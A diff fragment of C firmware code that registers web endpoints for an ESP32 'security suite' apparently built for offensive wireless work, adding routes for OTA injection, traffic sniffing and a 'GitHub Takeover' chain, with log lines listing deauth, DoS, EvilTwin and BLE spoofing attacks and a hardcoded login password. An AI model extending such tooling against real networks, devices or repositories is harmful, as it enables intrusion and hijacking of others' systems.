+        httpd_uri_t ota_github_urls_uri = { .uri = "/api/ota/github/urls", .method = HTTP_GET, .handler = ota_github_urls_handler };
+        httpd_register_uri_handler(server, &ota_github_urls_uri);
+        httpd_uri_t ota_inject_uri = { .uri = "/api/ota/inject", .method = HTTP_POST, .handler = ota_inject_handler };
+        httpd_register_uri_handler(server, &ota_inject_uri);
+        httpd_uri_t ota_download_uri = { .uri = "/api/ota/download", .method = HTTP_POST, .handler = ota_download_handler };
+        httpd_register_uri_handler(server, &ota_download_uri);
+        httpd_uri_t ota_download_result_uri = { .uri = "/api/ota/download/result", .method = HTTP_GET, .handler = ota_download_result_handler };
+        httpd_register_uri_handler(server, &ota_download_result_uri);
+        httpd_uri_t ota_dns_uri = { .uri = "/api/ota/dns", .method = HTTP_GET, .handler = ota_dns_handler };
+        httpd_register_uri_handler(server, &ota_dns_uri);
+        httpd_uri_t ota_http_uri = { .uri = "/api/ota/http", .method = HTTP_GET, .handler = ota_http_entries_handler };
+        httpd_register_uri_handler(server, &ota_http_uri);
+        /* OTA GitHub repo operations */
+        httpd_uri_t ota_github_parse_uri = { .uri = "/api/ota/github/parse", .method = HTTP_POST, .handler = ota_github_parse_handler };
+        httpd_register_uri_handler(server, &ota_github_parse_uri);
+        httpd_uri_t ota_github_access_uri = { .uri = "/api/ota/github/access", .method = HTTP_POST, .handler = ota_github_access_handler };
+        httpd_register_uri_handler(server, &ota_github_access_uri);
+        httpd_uri_t ota_github_list_uri = { .uri = "/api/ota/github/list", .method = HTTP_GET, .handler = ota_github_list_handler };
+        httpd_register_uri_handler(server, &ota_github_list_uri);
+        httpd_uri_t ota_github_sha_uri = { .uri = "/api/ota/github/file-sha", .method = HTTP_POST, .handler = ota_github_file_sha_handler };
+        httpd_register_uri_handler(server, &ota_github_sha_uri);
+        httpd_uri_t ota_github_upload_uri = { .uri = "/api/ota/github/upload", .method = HTTP_POST, .handler = ota_github_upload_handler };
+        httpd_register_uri_handler(server, &ota_github_upload_uri);
+        httpd_uri_t ota_github_repo_uri = { .uri = "/api/ota/github/repo", .method = HTTP_GET, .handler = ota_github_repo_handler };
+        httpd_register_uri_handler(server, &ota_github_repo_uri);
+        httpd_uri_t ota_github_result_uri = { .uri = "/api/ota/github/result", .method = HTTP_GET, .handler = ota_github_result_handler };
+        httpd_register_uri_handler(server, &ota_github_result_uri);
+        httpd_uri_t ota_chain_uri = { .uri = "/api/ota/chain", .method = HTTP_POST, .handler = ota_chain_handler };
+        httpd_register_uri_handler(server, &ota_chain_uri);
         
         ESP_LOGI(TAG, "==========================================");
-        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v5.1");
+        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v6.0");
         ESP_LOGI(TAG, "Web server started! Open http://192.168.4.1");
         ESP_LOGI(TAG, "Username: omega | Password: solutions123");
         ESP_LOGI(TAG, "WiFi: Deauth, Deauth Detect, Beacon, DoS, Handshake, PMKID, Probe, EvilTwin");
+        ESP_LOGI(TAG, "OTA: Sniff, Client, Inject, Fetch, Poll Sniff, GitHub Takeover, Full Chain");
         ESP_LOGI(TAG, "BLE: Spam, Scan, Spoof, Clone, Connect, L2CAP, GATT, Deauth, Passkey, Takeover");
         ESP_LOGI(TAG, "==========================================");
     }
